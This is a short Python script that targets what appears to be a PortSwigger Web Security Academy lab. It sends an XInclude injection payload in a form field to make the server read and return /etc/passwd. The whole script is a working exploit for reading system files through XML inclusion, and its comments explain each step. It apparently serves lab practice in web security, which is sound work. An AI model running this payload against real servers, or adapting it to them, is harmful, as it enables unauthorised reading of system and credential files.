import requests

# Target URL
url = "https://0a4f006503ba7db783cae227004b002f.web-security-academy.net/product/stock"

# The malicious payload to include a sensitive file via XInclude
xxe_payload = """
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
"""

# Prepare the data for the POST request
data = {
    'productId': xxe_payload,  # Inject the payload into the productId field
    'storeId': '1'  # Use a valid storeId or try injecting here as well
}

# Send the request to the target URL
response = requests.post(url, data=data)

# Check if the response contains the contents of the file or any relevant error message
if response.status_code == 200:
    print("Response Status Code:", response.status_code)
    print("Response Text (Error or File Content):")
    print(response.text)  # Print the response body to check for any leaked file content
else:
    print("Request failed with status code:", response.status_code)
